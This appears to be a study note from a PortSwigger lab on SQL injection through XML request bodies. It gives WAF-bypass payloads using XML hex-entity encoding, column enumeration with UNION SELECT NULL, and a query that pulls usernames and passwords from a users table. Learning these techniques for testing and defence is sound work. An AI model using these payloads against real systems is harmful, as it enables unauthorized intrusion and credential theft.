# SQL Injection

SQL injection is a vulnerability where user-supplied input is inserted
into a SQL query without proper sanitisation, allowing an attacker to
manipulate the query logic.

---

## How It Works

A vulnerable query looks like this:

```sql
SELECT * FROM products WHERE id = '[user input]';
```

If input is not sanitised, an attacker can break out of the intended
query and inject their own SQL logic.

---

## XML-Based SQL Injection

SQL injection is not limited to URL parameters or form fields.
Endpoints that accept **XML body data** can also be vulnerable.

The application reads values from XML tags and passes them into
a SQL query directly:

```xml
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

If `storeId` is unsanitised, it becomes an injection point.

---

## WAF Bypass via XML Hex Entity Encoding

WAFs (Web Application Firewalls) detect SQL keywords like
`UNION`, `SELECT`, `FROM` in raw request data.

**Bypass technique:** Encode the payload using XML hex entities.
The WAF sees encoded text and allows it through.
The XML parser decodes it before the app uses it in the query.

```
U  →  &#x55;
N  →  &#x4e;
I  →  &#x49;
O  →  &#x4f;
N  →  &#x4e;
```

So `UNION SELECT` becomes:

```
&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;
```

The database receives a fully decoded, valid SQL query.

---

## Column Enumeration

Before extracting data you need to know how many columns the
query returns. Use `UNION SELECT NULL` and keep adding NULLs
until the query succeeds:

```sql
1 UNION SELECT NULL        -- success = 1 column
1 UNION SELECT NULL,NULL   -- fail = not 2 columns
```

---

## Extracting Data with One Column

When only one column is available, concatenate multiple fields
using `||` to pull them in a single query:

```sql
1 UNION SELECT username || '~' || password FROM users
```

The `~` acts as a separator so you can split the output easily.

---

## Key Concepts

| Concept | Notes |
|---|---|
| Injection point | Can be XML, JSON, headers — not just URL params |
| WAF bypass | Encoding exploits the gap between WAF inspection and XML parsing |
| Column count | Always enumerate before extracting data |
| Concatenation | Use `||` to combine fields when limited to one column |

---

## Tools

- Burp Suite — intercept and modify requests
- Repeater — test payloads manually
- Hackvertor (Burp extension) — encode payloads quickly

---

## References

- [PortSwigger: SQL injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger: XML encoding bypass](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
